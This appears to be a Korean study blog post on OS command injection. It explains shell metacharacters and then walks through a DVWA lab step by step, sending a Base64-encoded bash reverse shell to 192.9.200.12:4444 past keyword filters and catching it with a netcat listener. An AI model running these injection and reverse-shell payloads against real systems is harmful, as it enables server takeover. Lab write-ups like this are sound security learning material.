---
layout: post
title: "명령어 인젝션 공부"
date: 2025-09-03 17:00:00 +0900
categories: [웹 해킹]
---

### 1. 개요

명령어 인젝션은 사용자의 입력값이 서버의 쉘 명령어의 일부로 검증 없이 전달될 때 발생하는 취약점이다. 공격자는 쉘의 특수문자(Metacharacters)를 주입하여 원래의 명령어를 종료시키거나 변조하고 자신이 원하는 새로운 명령어를 실행시킬 수 있다.

---

### 2. 주요 공격 기법

공격의 핵심은 쉘 메타 문자를 사용하여 명령어의 흐름을 제어하는 것이다.

*   **`;` (Semicolon):** 앞 명령어의 성공 여부와 관계없이 다음 명령어를 순차적으로 실행한다.
    ```
    ping 127.0.0.1; whoami
    ```
*   **`&&` (Ampersand):** 앞 명령어가 성공적으로 실행되었을 때만 다음 명령어를 실행한다.
    ```
    ping 127.0.0.1 && whoami
    ```
*   **`|` (Pipe):** 앞 명령어의 표준 출력(stdout)을 다음 명령어의 표준 입력(stdin)으로 전달한다.

---

### 3. 필터링 우회 기법

#### ***키워드 필터링 우회 (Base64 인코딩)***

`cat`, `ls`, `bash` 등 특정 명령어가 서버에서 차단될 경우,  
공격자는 명령어를 **Base64로 인코딩**해 필터를 우회할 수 있다.  
서버 측에서 이를 디코딩 후 실행하면, 차단되지 않은 상태로 명령어가 수행된다.

#### ***공격 흐름 (5단계)***

***1. 공격자: 리버스 셸 페이로드 인코딩***  
로컬 머신에서 실행할 명령어를 Base64로 인코딩한다.

```bash
$ echo "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx
```

>  인코딩된 문자열(`YmFzaC...`)을 복사해 둔다.

***2. 공격자: 리스너 준비***
Netcat으로 4444 포트에서 연결을 기다린다.

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

***3. 공격: DVWA에 페이로드 삽입***
DVWA의 `Command Injection` 입력란에 다음을 전달한다.

```text
127.0.0.1; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuOS4yMDAuMTIvNDQ0NCAwPiYx | base64 -d | bash
```

- `127.0.0.1`은 원래 ping 명령의 대상 (정상 요청처럼 위장)  
- `;` 이후가 실제 공격 페이로드  
- `echo ... | base64 -d | bash` → 인코딩된 명령어를 디코딩 후 실행

***4. 서버: 명령어 실행***
서버는 내부적으로 다음을 수행한다:

```bash
# 1. echo로 인코딩 문자열 출력
# 2. base64 -d로 디코딩 → "bash -i >& /dev/tcp/192.9.200.12/4444 0>&1"
# 3. 그 결과를 bash에 파이프 → 리버스 셸 연결 시도
```

***5. 공격 성공: 리버스 셸 획득***  
공격자의 Netcat 터미널에 연결이 수립되고, 쉘 접근이 가능해진다.

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.9.200.12] from (UNKNOWN) [192.9.200.11] 38912
www-data@dvwa:/var/www/html$
www-data@dvwa:/var/www/html$ whoami
www-data
```

>  이 시점에서 공격자는 서버의 `www-data` 권한으로 명령어를 자유롭게 실행할 수 있다.

---

### 이 방식이 사용되는 이유

- ***필터링 회피***: `bash`, `/dev/tcp` 같은 키워드가 직접 전달되지 않음  
- ***유연성***: 어떤 명령어든 Base64로 감싸 전달 가능  
- ***실전 적용***: `A01:2021` 보고서에서도 동일 기법으로 서버 제어권 확보

<hr class="short-rule">